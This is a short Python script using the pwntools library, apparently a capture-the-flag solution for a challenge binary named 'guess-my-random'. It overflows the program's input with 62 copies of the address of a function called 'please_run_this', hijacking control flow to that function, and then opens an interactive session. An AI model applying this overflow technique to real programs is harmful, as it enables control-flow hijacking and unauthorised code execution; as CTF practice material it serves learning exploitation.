#!/usr/bin/env python
from pwn import *

p = process('./guess-my-random')
exec_addr = p.elf.symbols['please_run_this']
print(p.recv())
print(p32(exec_addr))
x=p32(exec_addr)*62
p.sendline(x)
p.interactive()

